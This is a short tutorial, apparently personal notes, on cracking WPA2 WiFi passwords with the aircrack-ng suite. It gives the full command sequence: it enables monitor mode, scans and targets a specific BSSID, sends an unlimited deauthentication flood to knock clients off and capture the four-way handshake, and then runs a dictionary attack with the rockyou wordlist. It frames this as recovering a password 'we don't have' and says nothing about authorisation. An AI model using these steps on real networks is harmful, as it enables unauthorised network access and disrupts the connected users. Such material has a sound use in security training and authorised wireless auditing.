# Wifi password recover

Normally the wifi has some password that we either don't have or forgot. So, let's see some techniques to discover them.

# [Aircrack-ng suite](https://www.aircrack-ng.org/)

The first used tool for wi-fi craking is the Aircrack tool that exploits the auth processes of a network seeking for vunerabilities that potentially end up in a successfull attack.

So, in the following chapters we're going to see some common approachs.

## WPA Attack - Four way handshake

Requirements:

- A device connected to a newtork
- A wireless adapter that supports monitor mode

So, given the requirements, we are going to first see the wireless adapter with 

> ip link show

So, you see the connected wireless adapters and if they're up or not. So, you can now change this adapter to monitor mode using the *airmon-ng* tool:

> sudo airmon-ng start wlan0

You could've used any wireless adapter instead of *wlan0*, must notice only to pass the proper name.

Now that it's in monitor mode, you can scan all available networks:

> sudo airodump-ng wlan0mon

                                                                              
 BSSID            |    PWR    | Beacons |#Data | #/s | CH |  MB | ENC  | CIPHER | AUTH |  ESSID  
------------------|-----------|---------|------|-----|----|-----|------|--------|------|---------
00:1A:3F:B8:09:2A |    -126   |    6    |   0  |  0  | 11 | 135 | WPA2 |  CCMP  | PSK  | keisynet

Now you should target the desired nework, and look for connected devices.

> sudo airodump-ng wlan0mon -d 00:1A:3F:B8:09:2A

CH  1 ][ Elapsed: 24 s ][ 2022-09-01 13:20                                                      
                                                                                                 
BSSID             | PWR |  Beacons   |  #Data,|  #/s |  CH |   MB  |  ENC | CIPHER |  AUTH |  ESSID                 
------------------|-----|------------|--------|------|-----|-------|------|--------|-------|---------                       
00:1A:3F:B8:09:2A | -40 |    28      |  56    |  25  |  11 |  135  | WPA2 |  CCMP  |  PSK  | keisynet              

BSSID             | STATION           |         PWR |  Rate    | Lost  | Frames | Notes |  Probes               
------------------|-------------------|-------------|----------|-------|--------|-------|---------|
00:1A:3F:B8:09:2A | 2E:F1:40:00:E9:2E |     -35     |  24e-24e | 2069  |     80                  

Now we're going to try to  write the thing.

> sudo airodump-ng -w hackei -c 11 --bssid 00:1A:3F:B8:09:2A wlan0mon

Now we have to try to disconnect any device that is connected on this network to recieve a WPA 4 wayo handshake from aircrack.

> sudo aireplay-ng --deauth 0 -a 00:1A:3F:B8:09:2A wlan0mon

After getting the handshacke on the airodump-ng command, we can stop the programs and stop monitor mode. Now we can try to crack the password using a dictionary of common passwords.

> aircrack-ng hackei-01.cap -w /rockyou.txt

It may take a while and, normaly, it's not gonna work at all. So, let's jump to the usage of other tools to see if we can crack it anyways.




